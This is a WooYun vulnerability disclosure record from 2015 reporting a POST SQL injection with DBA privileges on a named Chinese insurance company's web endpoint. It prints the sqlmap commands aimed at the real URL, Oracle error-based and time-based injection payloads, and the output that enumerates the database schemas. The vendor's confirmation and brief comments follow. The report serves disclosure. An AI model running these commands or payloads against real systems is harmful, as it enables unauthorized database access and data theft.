{"id": 66417, "wybug_id": "wooyun-2015-0139131", "wybug_title": "泛华某站存在Post注入DBA权限", "wybug_corp": "泛华保险服务集团", "wybug_author": "SuperRookie", "wybug_date": "2015-09-05 12:47", "wybug_open_date": "2015-10-25 10:34", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-09-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-09-10：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-09-20：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-30：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-10-10：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-25：\t细节向公众公开  简要描述： 泛华是一家很大方的保险公司 我喜欢大方的保险公司 详细说明：  \nsqlmap -u \"http://ess.cninsure.net/product/common/cvar/CExec.jsp\" --data \"txtVarData=88952634&txtOther=88952634&txtFrameName=88952634&txtSQL=88952634&startIndex=88952634&txtQueryResult=88952634&mOperate=88952634&txtCodeCondition=88952634&txtConditionField=88952634&txtShowWidth=88952634&txtCodeName=88952634\" --is-dba\n   漏洞证明：   表什么的太多了 懒得复制 随便截图了\nsqlmap -u \"http://ess.cninsure.net/product/common/cvar/CExec.jsp\" --data \"txtVarData=88952634&txtOther=88952634&txtFrameName=88952634&txtSQL=88952634&startIndex=88952634&txtQueryResult=88952634&mOperate=88952634&txtCodeCondition=88952634&txtConditionField=88952634&txtShowWidth=88952634&txtCodeName=88952634\" --is-dba         _ ___ ___| |_____ ___ ___  {1.0-dev-nongit-20150816}|_ -| . | |     | .'| . ||___|_  |_|_|_|_|__,|  _|      |_|           |_|   http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 12:15:01[12:15:01] [INFO] resuming back-end DBMS 'oracle' [12:15:01] [INFO] testing connection to the target URLsqlmap resumed the following injection point(s) from stored session:---Parameter: txtCodeCondition (POST)    Type: error-based    Title: Oracle AND error-based - WHERE or HAVING clause (XMLType)    Payload: txtVarData=88952634&txtOther=88952634&txtFrameName=88952634&txtSQL=88952634&startIndex=88952634&txtQueryResult=88952634&mOperate=88952634&txtCodeCondition=88952634'||(SELECT 'BWin' FROM DUAL WHERE 4453=4453 AND 4692=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(98)||CHR(118)||CHR(107)||CHR(113)||(SELECT (CASE WHEN (4692=4692) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(112)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL))||'&txtConditionField=88952634&txtShowWidth=88952634&txtCodeName=88952634    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: txtVarData=88952634&txtOther=88952634&txtFrameName=88952634&txtSQL=88952634&startIndex=88952634&txtQueryResult=88952634&mOperate=88952634&txtCodeCondition=88952634'||(SELECT 'QgBW' FROM DUAL WHERE 9076=9076 AND 1193=DBMS_PIPE.RECEIVE_MESSAGE(CHR(89)||CHR(110)||CHR(65)||CHR(69),5))||'&txtConditionField=88952634&txtShowWidth=88952634&txtCodeName=88952634---[12:15:01] [INFO] the back-end DBMS is Oracleweb application technology: JSPback-end DBMS: Oracle[12:15:01] [INFO] testing if current user is DBAcurrent user is DBA:    True[12:15:01] [INFO] fetched data logged to text files under '/root/.sqlmap/output/ess.cninsure.net'\nDBA 权限  你懂的\nsqlmap -u \"http://ess.cninsure.net/product/common/cvar/CExec.jsp\" --data \"txtVarData=88952634&txtOther=88952634&txtFrameName=88952634&txtSQL=88952634&startIndex=88952634&txtQueryResult=88952634&mOperate=88952634&txtCodeCondition=88952634&txtConditionField=88952634&txtShowWidth=88952634&txtCodeName=88952634\" --dbs         _ ___ ___| |_____ ___ ___  {1.0-dev-nongit-20150816}|_ -| . | |     | .'| . ||___|_  |_|_|_|_|__,|  _|      |_|           |_|   http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 12:16:24[12:16:24] [INFO] resuming back-end DBMS 'oracle' [12:16:24] [INFO] testing connection to the target URLsqlmap resumed the following injection point(s) from stored session:---Parameter: txtCodeCondition (POST)    Type: error-based    Title: Oracle AND error-based - WHERE or HAVING clause (XMLType)    Payload: txtVarData=88952634&txtOther=88952634&txtFrameName=88952634&txtSQL=88952634&startIndex=88952634&txtQueryResult=88952634&mOperate=88952634&txtCodeCondition=88952634'||(SELECT 'BWin' FROM DUAL WHERE 4453=4453 AND 4692=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(98)||CHR(118)||CHR(107)||CHR(113)||(SELECT (CASE WHEN (4692=4692) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(112)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL))||'&txtConditionField=88952634&txtShowWidth=88952634&txtCodeName=88952634    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: txtVarData=88952634&txtOther=88952634&txtFrameName=88952634&txtSQL=88952634&startIndex=88952634&txtQueryResult=88952634&mOperate=88952634&txtCodeCondition=88952634'||(SELECT 'QgBW' FROM DUAL WHERE 9076=9076 AND 1193=DBMS_PIPE.RECEIVE_MESSAGE(CHR(89)||CHR(110)||CHR(65)||CHR(69),5))||'&txtConditionField=88952634&txtShowWidth=88952634&txtCodeName=88952634---[12:16:24] [INFO] the back-end DBMS is Oracleweb application technology: JSPback-end DBMS: Oracle[12:16:24] [WARNING] schema names are going to be used on Oracle for enumeration as the counterpart to database names on other DBMSes[12:16:24] [INFO] fetching database (schema) names[12:16:24] [INFO] the SQL query used returns 13 entries[12:16:24] [INFO] resumed: CALLCENTER[12:16:24] [INFO] resumed: DBSNMP[12:16:24] [INFO] resumed: INSWELL[12:16:24] [INFO] resumed: OUTLN[12:16:24] [INFO] resumed: PORTALDATA[12:16:24] [INFO] resumed: PORTALPUBLIC[12:16:24] [INFO] resumed: PRODUCTDATA[12:16:24] [INFO] resumed: PROPOSAL[12:16:24] [INFO] resumed: SYS[12:16:24] [INFO] resumed: SYSTEM[12:16:24] [INFO] resumed: TSMSYS[12:16:24] [INFO] resumed: WEIXIN_DB[12:16:24] [INFO] resumed: WMSYSavailable databases [13]:[*] CALLCENTER[*] DBSNMP[*] INSWELL[*] OUTLN[*] PORTALDATA[*] PORTALPUBLIC[*] PRODUCTDATA[*] PROPOSAL[*] SYS[*] SYSTEM[*] TSMSYS[*] WEIXIN_DB[*] WMSYS[12:16:24] [INFO] fetched data logged to text files under '/root/.sqlmap/output/ess.cninsure.net'[*] shutting down at 12:16:24\n  至于多少 表 你们懂得    修复方案：     版权声明：转载请注明来源 SuperRookie@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-09-10 10:33 厂商回复： 非常感谢，已在处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-09-05 14:09 |    \t\t牛 小 帅 \t\t\t( 普通白帽子  |\t\t\t        Rank:434 漏洞数:102        | 什么狗屁爱，生活已乱套！人的一生中，...)\t\t \n  @SuperRookie  苏哥 哈哈    \n     2015-09-11 15:26 |    \t\tSuperRookie \t\t\t( 实习白帽子  |\t\t\t        Rank:58 漏洞数:9        | 求收编，本人会注入，会上传，会Xss，会破...)\t\t \n  亲测毛都没    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}